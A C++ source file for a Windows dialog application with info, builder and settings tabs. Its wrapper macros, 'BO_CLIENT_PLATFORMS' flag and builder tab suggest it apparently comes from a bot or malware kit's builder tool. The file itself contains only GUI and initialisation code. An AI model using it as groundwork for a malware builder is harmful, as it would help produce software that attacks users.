#include <windows.h>
#include <commctrl.h>
#include <ole2.h>
#include <shlwapi.h>

#include "defines.h"
#include "resources\resources.h"
#include "main.h"
#include "languages.h"
#include "tools.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\crypt.h"
#include "..\common\fs.h"
#include "..\common\gui.h"
#include "..\common\comlibrary.h"

//Global variables.
HMODULE currentModule;       //Tekusheyu handle to the module.
WCHAR homePath[MAX_PATH];    //Home directory.
WCHAR settingsFile[MAX_PATH]; //Options file.

# if defined SUBSYSTEM_CONSOLE

# else
static HRESULT comResult;     //Value of ComLibrary:: _initThread ().

//Data on the tabs.
INT_PTR CALLBACK toolInformationProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK toolBuilderProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK toolSettingsProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

typedef struct
{
  HWND hwnd;
  DWORD lngId;
  DWORD resId;
  DLGPROC dlgProc;
}TOOLDATA;

static TOOLDATA toolsList[] =
{
  {NULL, Languages::tool_title_info,     DIALOG_TOOL_INFO,     toolInformationProc},
#if(BO_CLIENT_PLATFORMS > 0)
  {NULL, Languages::tool_title_builder,  DIALOG_TOOL_BUILDER,  toolBuilderProc},
#endif
  {NULL, Languages::tool_title_settings, DIALOG_TOOL_SETTINGS, toolSettingsProc},
};
static BYTE lastTool         = 0xFF;
#define toolsCount (sizeof(toolsList) / sizeof(TOOLDATA))

/*
  Загрузка вкладки.

  IN hwnd  - родитель.
  IN index - индекс вкладки.
*/
static void loadTool(HWND hwnd, BYTE index)
{
  if(index != lastTool)
  {
    TOOLDATA *ct = &toolsList[index];
    CWA(user32, SetDlgItemTextW)(hwnd, IDC_TITLE, Languages::get(ct->lngId));
    if(lastTool != 0xFF)CWA(user32, ShowWindow)(toolsList[lastTool].hwnd, SW_HIDE);
    if(ct->hwnd == NULL)ct->hwnd = CWA(user32, CreateDialogParamW)(currentModule, MAKEINTRESOURCEW(ct->resId), hwnd, ct->dlgProc, NULL);
    lastTool = index;
    CWA(user32, ShowWindow)(ct->hwnd, SW_SHOW);
  }
}

/*
  Функция главного окна.
*/
static INT_PTR CALLBACK mainDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
  switch(msg)
  {
    case WM_INITDIALOG:
    {
      //Fill in the list of tabs.
      {
        HWND hLB = CWA(user32, GetDlgItem)(hwnd, IDC_TOOLSLIST);
        for(BYTE i = 0; i < toolsCount; i++)CWA(user32, SendMessageW)(hLB, LB_ADDSTRING, 0, (LPARAM)Languages::get(toolsList[i].lngId));
        CWA(user32, SendMessageW)(hLB, LB_SETCURSEL, 0, 0);
      }

      //Load the icon.
      {
        HICON hIcon = Gui::_loadSharedIcon(currentModule, MAKEINTRESOURCEW(ICON_MAIN));
        CWA(user32, SendMessageW)(hwnd, WM_SETICON, ICON_SMALL, (WPARAM)hIcon);
        CWA(user32, SendMessageW)(hwnd, WM_SETICON, ICON_BIG, (WPARAM)hIcon);
      }

      //Open the tab by default.
      loadTool(hwnd, 0);

      //Expose the title.
      CWA(user32, SetWindowTextW)(hwnd, Languages::get(Languages::main_title));
      break;
    }

    case WM_DESTROY:
    {
      for(BYTE i = 0; i < toolsCount; i++)if(toolsList[i].hwnd != NULL)CWA(user32, DestroyWindow)(toolsList[i].hwnd);
      break;
    }

    case WM_CLOSE:
    {
      //Send out all the tabs predlozhenenie of closure.
      for(BYTE i = 0; i < toolsCount; i++)if(toolsList[i].hwnd)
      {
        if((bool)CWA(user32, SendMessageW)(toolsList[i].hwnd, WM_CANCLOSE, 0, 0) == false)return TRUE;
      }
      CWA(user32, EndDialog)(hwnd, 0);
      break;
    }

    case WM_COMMAND: 
    {
      switch(LOWORD(wParam))  
      {
        case IDC_TOOLSLIST:
          if(HIWORD(wParam) == LBN_SELCHANGE)loadTool(hwnd, (UINT)CWA(user32, SendMessageW)((HWND)lParam, LB_GETCURSEL, 0, 0));
          break;

        default:
          return FALSE;
      }
      break;
    }

    default:
      return FALSE;
  }
  
  return TRUE;
}
#endif

/*В В Entry point.*/
void WINAPI entryPoint(void)
{
  //Initialization data of the GUI.
  if(!Gui::_loadCommonControl(ICC_STANDARD_CLASSES) || !ComLibrary::_initThread(&comResult))
  {
    CWA(kernel32, ExitProcess)(1);
    return;
  }

  //Initialization modules.
  currentModule = CWA(kernel32, GetModuleHandleW)(NULL);
  
  Mem::init();
  Crypt::init();

  //Obtain the working directory.
  CWA(kernel32, GetModuleFileNameW)(NULL, homePath, MAX_PATH);
  CWA(shlwapi, PathRemoveFileSpecW)(homePath);
  
  //Obtain the configuration file.
  if(CWA(shlwapi, PathCombineW)(settingsFile, homePath, L"settings.ini") == FALSE)settingsFile[0] = 0;

  Languages::init();

  //Run main dialog.
  CWA(user32, DialogBoxParamW)(currentModule, MAKEINTRESOURCEW(DIALOG_MAIN), NULL, mainDialogProc, NULL);

  //Deinitialization modules.
  Languages::uninit();
  Crypt::uninit();
  Mem::uninit();  

  //Deinitialization data for the GUI.
  ComLibrary::_uninitThread(comResult);
  CWA(kernel32, ExitProcess)(0);
}
